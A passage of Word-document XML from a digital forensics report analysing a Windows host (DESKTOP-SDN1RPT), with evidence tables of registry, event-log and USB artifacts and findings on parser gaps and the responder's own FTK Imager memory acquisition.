          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:59:58.124958</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Profile: last logon</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith</w:t>
              <w:br/>
              <w:t>S-1-5-21-2232410529-1445159330-2725690660-1108</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_ProfileList.csv#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:52:13.567580</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Profile: key written ; Profile: last logoff</w:t>
              <w:br/>
              <w:t>C:\Users\Administrator</w:t>
              <w:br/>
              <w:t>S-1-5-21-2232410529-1445159330-2725690660-500</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_ProfileList.csv#6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:15:57.342764</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Profile: last logon</w:t>
              <w:br/>
              <w:t>C:\Users\Admin</w:t>
              <w:br/>
              <w:t>S-1-5-21-41211245-796119838-3940169921-1001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_ProfileList.csv#7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:27.001485</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\SystemSettingsAdminFlows.exe (DESKTOP-SDN1RPT)</w:t>
              <w:br/>
              <w:t>System 1074 | User32 | A user initiated a system restart | Hostname: DESKTOP-SDN1RPT | Reason: Other (Unplanned) | Type: restart | Code: 0x0 | C:\Windows\system32\SystemSettingsAdminFlows.exe (DESKTOP-SDN1RPT)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40266</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:39.868133</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 6005 | EventLog | The Event log service was started | Computer: DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40276</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:33.459149</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 6005 | EventLog | The Event log service was started | Computer: WIN-2IH1TBB9I4Q</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39910</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:40:37.260392</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4726 | Microsoft-Windows-Security-Auditing | A user account was deleted | Target: DESKTOP-SDN1RPT\defaultuser0 (S-1-5-21-41211245-796119838-3940169921-1000) | SubjectLogonId: 0x1A6AA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38364</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432948</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C137\Administrator | LogonType 10 | LogonId: 0x857E73 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (10.42.85.10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39576</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:04.797835</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 12 | Microsoft-Windows-Kernel-General | OS was started | StartTime: 2020-09-19 01:24:04.5000000 | BootMode: Normal boot</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40528</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_info</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "Value": "2020-09-19 05:10:39+00:00", "Variable": "SystemTime"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.info.Info.jsonl#12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_image</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"image": "C:\\Sleuthline\\cases\\test04\\memory\\DESKTOP-SDN1RPT.mem", "name": "DESKTOP-SDN1RPT.mem", "bytes": "2147483648", "sha256": "AC6EE0E8C273103B94D776F54192D2C6ACF8303AABBD6A199254030C69F667C3"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/memory_image.jsonl#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.pcap_files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"file": "C:\\Sleuthline\\cases\\test04\\pcap\\case001.pcap", "name": "case001.pcap", "bytes": "197583252", "sha256": "09ABF49EFEA1852E047987D92907704D47F36D75F6C8056E2CAFA6CC027791CB"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/pcap_files.jsonl#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-005: Scope limitation: empty or incomplete parser outputs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accounts (sam)</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2020-09-18 05:49:07.890379 → 2020-09-18 05:49:07.890379</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Job odl (OneDrive logs) status "warning": general.keystore / ObfuscationStringMap absent, ODL strings stay obfuscated. Empty (0-byte) Dissect outputs: browser.history/downloads/extensions, iexplore.history, powershell_history (PSReadLine), recyclebin, tasks, userassist, mru.*, wer, thumbcache, defender.quarantine, defender.exclusions, firewall.logs, cim.consumerbindings, activitiescache, usb. SBECmd NTUSER outputs empty for Admin, Administrator, mortysmith, ricksanchez (ShellBags only from UsrClass). SIDR internet history report empty. Several Volatility plugins produced no output (amcache, userassist, svcdiff, hollowprocesses, processghosting, skeleton_key_check, etc.). Equivalent data exists from other parsers for some of them: RECmd TaskCache (304 rows) and vol_scheduled_tasks for tasks, RECmd UserAssist (60 rows), WxTCmd ActivitiesCache (201 rows).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>No browser history is available (empty Dissect output — either no browser use or artifacts not collected/parsed): web-based initial access must be assessed from the pcap (Suricata HTTP/TLS/DNS) and file-system artifacts. Absence of PowerShell PSReadLine history and Recycle Bin entries cannot be interpreted as absence of activity.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (1)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05:49:07.890379</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Account created</w:t>
              <w:br/>
              <w:t>Admin RID=1001 logons=6 groups=Administrators</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_UserAccounts.csv#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-002: Evidence acquisition activity (FTK Imager from USB "Incident_drive") — to be excluded from findings</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artifact:amcache (files)</w:t>
              <w:br/>
              <w:t>artifact:prefetch</w:t>
              <w:br/>
              <w:t>artifact:registry: portable devices (wpd)</w:t>
              <w:br/>
              <w:t>artifact:registry: usb</w:t>
              <w:br/>
              <w:t>artifact:registry: usbstor</w:t>
              <w:br/>
              <w:t>artifact:registry: volumeinfocache</w:t>
              <w:br/>
              <w:t>evtx:security.evtx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2020-09-19 05:08:15.224593 → 2020-09-19 05:09:56.191578</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>At 2020-09-19 05:08:15 C137\ricksanchez logs on (4624 type 11 then type 7, unlock). At 05:08:58 a SanDisk Cruzer Glide 3.0 USB device (VID_0781&amp;PID_5597, serial 4C530000261130109435) is first installed/connected (USBSTOR FirstInstalled/LastConnected 05:08:58.406), mounted as E: with label "Incident_drive" (VolumeInfoCache 05:08:58.625, WPD 05:08:59). At 05:09:56.19 "E:\FTK Imager\FTK Imager.exe" (AccessData FTK Imager 4.2.1.4, SHA1 32756b3a319340c4b7fead410d3f36e503b30da2) executes (Prefetch FTK IMAGER.EXE RunCount 1, volume serial A6125E71; Amcache unassociated file entry). The memory image's SystemTime is 2020-09-19 05:10:39 UTC. SNIPPINGTOOL.EXE (05:09:09) and MSINFO32.EXE (05:09:13) also executed in the same minute. No KAPE execution trace exists on the host (collection likely made offline/from the image: the KAPE raw folder is "F\").</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>This is the responder's acquisition (memory capture with FTK Imager from an external incident drive). Events from 2020-09-19 05:08:15 onwards (USB device, FTK Imager, consent.exe, msinfo32/snippingtool most probably operator documentation) are considered collection activity and are excluded from attacker findings. Note: the disk artifacts extend to ~05:19 UTC and the pcap to 05:38 UTC, i.e. beyond the memory acquisition.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (9)</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05:08:58.406346</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: USBSTOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USBSTOR: key written ; USBSTOR: installed ; USBSTOR: first installed (property 0064) ; USBSTOR: last connected (property 0066)</w:t>
              <w:br/>
              <w:t>Ven_SanDisk Prod_Cruzer_Glide_3.0 Rev_1.00 serial=4C530000261130109435&amp;0 SanDisk Cruzer Glide 3.0 USB Device  disk={ce43e459-fa16-11ea-95ef-000c2914c295}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_USBSTOR.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:58.625064</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: VolumeInfoCache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volume seen (VolumeInfoCache)</w:t>
              <w:br/>
              <w:t>DriveName=E: | VolumeLabel=Incident_drive | DriveType=Fixed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_VolumeInfoCache.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
